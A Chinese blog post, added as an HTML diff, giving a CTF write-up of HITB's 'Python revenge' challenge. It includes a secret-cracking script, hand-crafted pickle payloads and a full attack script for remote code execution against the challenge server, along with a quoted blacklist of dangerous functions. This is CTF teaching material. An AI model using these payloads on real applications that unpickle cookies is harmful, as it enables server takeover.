@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="default">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言最近参加的两场CTF线上赛都涉及到了Flask反序列化漏洞+Python沙箱逃逸，所以相结合HITB的Python Revenge题目总结一下Python的沙箱逃逸。 正文沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端等),脱离种种过滤和限制,最终成功拿到shell权限的过程 对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个  使用os包中的">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITB Python_revenge writeup &amp;&amp; python 沙箱逃逸详解">
+<meta property="og:url" content="http://m3lon.github.io/2018/04/19/HITB-Python-revenge-writeup-python-沙箱逃逸详解/index.html">
+<meta property="og:site_name" content="m3lon">
+<meta property="og:description" content="前言最近参加的两场CTF线上赛都涉及到了Flask反序列化漏洞+Python沙箱逃逸，所以相结合HITB的Python Revenge题目总结一下Python的沙箱逃逸。 正文沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端等),脱离种种过滤和限制,最终成功拿到shell权限的过程 对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个  使用os包中的">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://m3lon.github.io/2018/04/19/HITB-Python-revenge-writeup-python-沙箱逃逸详解/HITB-Python-revenge-writeup-python-沙箱逃逸详解/1.png">
+<meta property="og:updated_time" content="2018-04-19T03:44:28.434Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HITB Python_revenge writeup &amp;&amp; python 沙箱逃逸详解">
+<meta name="twitter:description" content="前言最近参加的两场CTF线上赛都涉及到了Flask反序列化漏洞+Python沙箱逃逸，所以相结合HITB的Python Revenge题目总结一下Python的沙箱逃逸。 正文沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端等),脱离种种过滤和限制,最终成功拿到shell权限的过程 对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个  使用os包中的">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/04/19/HITB-Python-revenge-writeup-python-沙箱逃逸详解/HITB-Python-revenge-writeup-python-沙箱逃逸详解/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://m3lon.github.io/2018/04/19/HITB-Python-revenge-writeup-python-沙箱逃逸详解/">
+
+
+
+
+
+  <title>HITB Python_revenge writeup && python 沙箱逃逸详解 | m3lon</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113184689-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+  <style>
+	blockquote {
+	  color: #888;
+	  background-color: #eae6f3;
+	  border-left: 1rem solid #5236a0;
+	  padding: 0 1.5rem;
+	  position: relative;
+	  font-family: 'Roboto', sans-serif;
+	}
+
+	blockquote:before,
+	blockquote:after {
+	  color: #392570;
+	  font-size: 2.5rem;
+	  position: absolute;
+	  line-height: 2.5rem;
+	}
+
+	blockquote:before {
+	  content: "\201C";
+	  left: -1rem;
+	  top: 0;
+	}
+
+	blockquote:after {
+	  content: "\201D";
+	  right: 0;
+	  bottom: -1rem;
+	}
+</style>
+</head>
+
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">m3lon</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2018/04/19/HITB-Python-revenge-writeup-python-沙箱逃逸详解/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m3lon">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/UMR.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m3lon">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HITB Python_revenge writeup && python 沙箱逃逸详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T11:31:58+08:00">
+                2018-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i> 浏览量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近参加的两场CTF线上赛都涉及到了Flask反序列化漏洞+Python沙箱逃逸，所以相结合HITB的Python Revenge题目总结一下Python的沙箱逃逸。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端等),脱离种种过滤和限制,最终成功拿到shell权限的过程</p>
+<p>对于python的沙箱逃逸而言,我们来实现目的的最终想法有以下几个</p>
+<ul>
+<li>使用os包中的popen,system两个函数来直接执行shell</li>
+<li>使用commands模块中的方法</li>
+<li>使用subprocess</li>
+<li>使用写文件到指定位置,再使用其他辅助手段<br>总体来说,我们使用以下几个函数,就可以直接愉快的拿到shell啦!</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">subprocess.call([<span class="string">'ifconfig'</span>],shell=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<p>但是,可以确定的是,防御者是不会这么轻易的让我们直接拿到shell的,肯定会有各种过滤,对代码进行各种各样的检查,来阻止可能的进攻。比如</p>
+<ul>
+<li>禁止引入敏感包</li>
+<li>过滤__builtin__包中危险函数如eval()、execfile()、exec()等</li>
+<li>将敏感包从<code>sys.modules</code>中删掉</li>
+</ul>
+<h3 id="0x01-相关基础"><a href="#0x01-相关基础" class="headerlink" title="0x01 相关基础"></a>0x01 相关基础</h3><ol>
+<li>python input函数</li>
+</ol>
+<blockquote>
+<p>Python3.x 中 input() 函数接受一个标准输入数据，返回为 string 类型。</p>
+<p>Python2.x :</p>
+<p>查看 <a href="http://docs.python.org/2/library/functions.html?highlight=input#built-in-functions" target="_blank" rel="noopener">Built-in Functions</a> ，得知：</p>
+<p>input([prompt]): Equivalent to eval(raw_input(prompt)) </p>
+<p>Consider using the raw_input() function for general input from users.</p>
+<p>除非对 input() 有特别需要，否则一般情况下我们都是推荐使用 raw_input() 来与用户交互。</p>
+</blockquote>
+<ol>
+<li><p>Python2.7中的__builtin__</p>
+<p>名称空间：名称（标识符）到对象的映射</p>
+<p>在一个正常的Python程序的执行过程中，至少存在两个名称空间：</p>
+<ul>
+<li>内建名称空间</li>
+<li>全局名称空间</li>
+</ul>
+<p>如果定义了函数，则还会有局部名称空间，全局名称空间一般由在程序的全局变量和它们对应的映射对象组成，而局部名称空间则在函数内部由函数局部变量和它们对应的映射对象组成，这里关键的是内建名称空间，它到底是怎么产生的？参考文档是这样写的：</p>
+<p><img src="HITB-Python-revenge-writeup-python-沙箱逃逸详解/1.png" alt="">我们把这些函数称为内建函数，是因为它们不需要我们程序员作任何定义，在启动Python解释器的时候，就已经导入到内存当中供我们使用。</p>
+</li>
+<li><p>__import__</p>
+<p>import 是一个关键字,因此,包的名字是直接以 ‘tag’(标记)的方式引入的,但是对于函数和包来说,引入的包的名字就是他们的参数,也就是说,将会以字符串的方式引入。</p>
+<p>我们可以对原始关键字做出种种处理来bypass掉源码扫描</p>
+<p>以__import__函数举例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f3ck = __import__(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>))</span><br><span class="line"><span class="keyword">print</span> f3ck.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure>
+<p>或者使用importlib 这一个库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">f3ck = importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)</span><br><span class="line"><span class="keyword">print</span> f3ck.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ol>
+<h3 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h3><p><a href="https://github.com/p4-team/ctf/blob/master/2018-04-11-hitb-quals/web_python/revenge.py" target="_blank" rel="noopener">题目源码</a>略长，这里仅贴出部分关键代码。题目使用了Flask框架，Web页面中有一个表单输入页面和显示我们输入内容的页面。</p>
+<p>关键在于页面存储我们输入内容的方式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location = request.form[<span class="string">"reminder"</span>]</span><br><span class="line">location = b64e(pickle.dumps(location))</span><br><span class="line">cookie = make_cookie(location, cookie_secret)</span><br></pre></td></tr></table></figure>
+<p>所以数据使用pickle存储在cookie中，不过还存在一个不可知的cookie_secret，对应的反序列化的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(strs)</span>:</span></span><br><span class="line">    reload(pickle)</span><br><span class="line">    files = StringIO(strs)</span><br><span class="line">    unpkler = pickle.Unpickler(files)</span><br><span class="line">    unpkler.dispatch[pickle.REDUCE] = _hook_call(</span><br><span class="line">        unpkler.dispatch[pickle.REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure>
+<p>反序列化的内容用户可控，就可以利用pickle反序列化自动执行__reduce__函数来进行RCE，相关原理网上已经有很多了，我自己之前也简单的分析过，<a href="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅析python unpickle反序列化漏洞</a></p>
+<p>可以看到，上面的loads反序列化函数中调用了_hook_call，而_hook_call函数中进行了大规模的过滤 :)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        session[<span class="string">'cnt'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> session[<span class="string">'cnt'</span>]</span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>].stack:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> black_type_list:</span><br><span class="line">                <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">            <span class="keyword">if</span> session[<span class="string">'cnt'</span>] &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> TimesException()</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>
+<p>另外，loads函数在getlocation()函数中被调用，而函数会首先进行cookie_secret的校验，通过之后才会执行loads函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlocation</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'location'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    (digest, location) = cookie.split(<span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):</span><br><span class="line">        flash(<span class="string">"Hey! This is not a valid cookie! Leave me alone."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    location = loads(b64d(location))</span><br><span class="line">    <span class="keyword">return</span> location</span><br></pre></td></tr></table></figure>
+<p>因此攻击过程中存在两个难点</p>
+<ol>
+<li>cookie_secret不可知</li>
+<li>python的黑名单绕过</li>
+</ol>
+<h3 id="0x03-尝试攻击"><a href="#0x03-尝试攻击" class="headerlink" title="0x03 尝试攻击"></a>0x03 尝试攻击</h3><p>首先解决第一个问题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'.secret'</span>):</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        secret = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits)</span><br><span class="line">                         <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">        f.write(secret)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cookie_secret = f.read().strip()</span><br></pre></td></tr></table></figure>
+<p>发现cookie_secret是写入.secret文件中，并且只写入一次！于是我们可以随便抓一个包取其中的cookie然后逆向分析就可以得到cookie_secret</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    data = <span class="string">'d7e3bd07f7ae389f07abe89d199ebae1e1e67b4479a98870ee5a3c4fe0f56237!VjErMQpwMAou'</span></span><br><span class="line">    (hash, msg) = data.split(<span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> itertools.product(string.ascii_letters + string.digits, repeat=<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(<span class="string">"%s%s"</span> % (msg, <span class="string">""</span>.join(c))).hexdigest() == hash:</span><br><span class="line">            print(<span class="string">""</span>.join(c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">break_cookie()</span><br></pre></td></tr></table></figure>
+<p>得到cookie_secret: hitb</p>
+<p>接下来，解决python的沙盒逃逸问题，首先我们要找出一个可以执行命令的函数，这里过滤很很多，但是仔细想想，可以观察到注意到这段代码的一个重要事情 - 它是Python 2，并且在黑名单中没有input（）函数。关于这个函数，python 2和3之间有很大的区别。在python 3中，它的行为与python 2中的raw_input（）相同 ,它只是从stdin读取输入。但在python 2中它所做的实际上是eval（raw_input（）），所以通过使用input（）我们可以做eval（）。input函数在__builtin__ moudle中，于是有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">input</span><br><span class="line">(S&apos;&gt; &apos;\ntR.</span><br></pre></td></tr></table></figure>
+<p>现在我们需要实际发送一些数据给函数，但是它从stdin读取数据。幸运的是python允许几乎所有的东西都可以修补，所以我们可以简单地将一些对象分配给sys.stdin，执行<code>setattr（sys，&#39;stdin&#39;，something_else）</code>，我们可以从__builtin__中获取setattr。但是获取sys模块对象，就需要导入它。这时可以调用__import__ （’sys’）[函数__import__在__builtin__中]。于是可以写出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">setattr</span><br><span class="line">(c__builtin__</span><br><span class="line">__import__</span><br><span class="line">(S&apos;sys&apos;</span><br><span class="line">tR</span><br><span class="line">S&apos;stdin&apos;</span><br><span class="line">SOMETHING_ELSE</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+<p>相当于<code>__builtin__.setattr(__builtin__.__import__(&#39;sys&#39;),&#39;stdin&#39;,SOMETHING_ELSE)</code></p>
+<p>接下来就要填充SOMETHING_ELSE了，我们可以使用StringIO类，一个可以直接在内存中进行读写的类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cStringIO</span><br><span class="line">StringIO</span><br><span class="line">(S&apos;command&apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+<p>于是得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__</span><br><span class="line">setattr</span><br><span class="line">(c__builtin__</span><br><span class="line">__import__</span><br><span class="line">(S&apos;sys&apos;</span><br><span class="line">tRS&apos;stdin&apos;</span><br><span class="line">cStringIO</span><br><span class="line">StringIO</span><br><span class="line">(S&apos;evil_command&apos;</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">input</span><br><span class="line">(S&apos;python&gt; &apos;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+<p>相当于</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.setattr(__builtin__.__import__(<span class="string">'sys'</span>),sysin,cStringIO.StringIO(<span class="string">'evil_conmand'</span>))</span><br><span class="line">__builtin__.inpput(<span class="string">'python&gt;'</span>)</span><br></pre></td></tr></table></figure>
+<p>最后的攻击脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_digest</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> sha256(<span class="string">"%s%s"</span> % (location, secret)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cookie</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">"%s!%s"</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://47.75.151.118:9999"</span></span><br><span class="line">    response = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command_to_eval = raw_input(<span class="string">"python&gt; "</span>)</span><br><span class="line">            payload = <span class="string">"c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S'sys'\ntRS'stdin'\ncStringIO\nStringIO\n(S'"</span> + command_to_eval + <span class="string">"'\ntRtRc__builtin__\ninput\n(S'&gt; '\ntR."</span></span><br><span class="line">            pickle.loads(payload)</span><br><span class="line">            response = requests.get(url, cookies=&#123;<span class="string">"location"</span>: make_cookie(base64.b64encode(payload), <span class="string">'hitb'</span>)&#125;)</span><br><span class="line">            <span class="keyword">print</span> re.findall(<span class="string">'&lt;h3 class="wow fadeInLeftBig"&gt;(.*?)&lt;/h3&gt;'</span>, response.text, re.DOTALL)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>可以输入__import__(‘os’).listdir(“/“)、__import__(‘os’).system(“ls”) 、__import__(‘subprocess’).check_output(“ls”)等进行测试，可以发现根目录下存在flag_is_here,执行open(“/flag_is_here”,”r”).read()，得到：HITB{Py5h0n1st8eBe3tNOW}</p>
+<p><strong>参考</strong></p>
+<p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">Python沙箱逃逸的n种姿势</a></p>
+<p><a href="https://github.com/p4-team/ctf/tree/master/2018-04-11-hitb-quals/web_python" target="_blank" rel="noopener">Python revenge (Web) writeup</a></p>
+<p><a href="http://xpleaf.blog.51cto.com/" target="_blank" rel="noopener">香飘叶子的51cto博客</a></p>
+
